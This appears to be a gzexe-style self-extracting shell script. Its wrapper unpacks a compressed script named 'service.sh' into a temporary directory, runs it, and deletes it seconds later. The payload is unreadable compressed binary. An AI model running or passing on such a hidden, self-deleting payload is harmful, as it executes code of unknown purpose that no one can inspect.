#!/bin/sh
skip=49

tab='	'
nl='
'
IFS=" $tab$nl"

umask=`umask`
umask 77

gztmpdir=
trap 'res=$?
  test -n "$gztmpdir" && rm -fr "$gztmpdir"
  (exit $res); exit $res
' 0 1 2 3 5 10 13 15

case $TMPDIR in
  / | /*/) ;;
  /*) TMPDIR=$TMPDIR/;;
  *) TMPDIR=/tmp/;;
esac
if type mktemp >/dev/null 2>&1; then
  gztmpdir=`mktemp -d "${TMPDIR}gztmpXXXXXXXXX"`
else
  gztmpdir=${TMPDIR}gztmp$$; mkdir $gztmpdir
fi || { (exit 127); exit 127; }

gztmp=$gztmpdir/$0
case $0 in
-* | */*'
') mkdir -p "$gztmp" && rm -r "$gztmp";;
*/*) gztmp=$gztmpdir/`basename "$0"`;;
esac || { (exit 127); exit 127; }

case `printf 'X\n' | tail -n +1 2>/dev/null` in
X) tail_n=-n;;
*) tail_n=;;
esac
if tail $tail_n +$skip <"$0" | gzip -cd > "$gztmp"; then
  umask $umask
  chmod 700 "$gztmp"
  (sleep 5; rm -fr "$gztmpdir") 2>/dev/null &
  "$gztmp" ${1+"$@"}; res=$?
else
  printf >&2 '%s\n' "Cannot decompress $0"
  (exit 127); res=127
fi; exit $res
�S4�gservice.sh �R�o�0���j���
i�qR)e��S����$�ċc3��U��s�J�i��s��޽\�$��
#�9�%�a����0�t�܌�_y���~C�O�L���*K&�ʑr�X��nqᴡ�����6_�6a������������l<�5�5�H|A�
��>JD��*gm�b��B��$m(��3�����z��*�JRY���O�*�P5K��̣�	�g���W����D3���l>��-o�<$���:*���_[�ݠxs��z�ШH����I<e� ���'�3�ZEk���c* �޻>"��r�d]&RX�����g�� ��j��Eq��O1C�νIhn<��1�uEF��L�����I�y�8}>�Q�Dڌ�Y?#n���7�c��C*�
I�ɇ)�������?��W���	B�r���/��j�W8K�"�:"Q  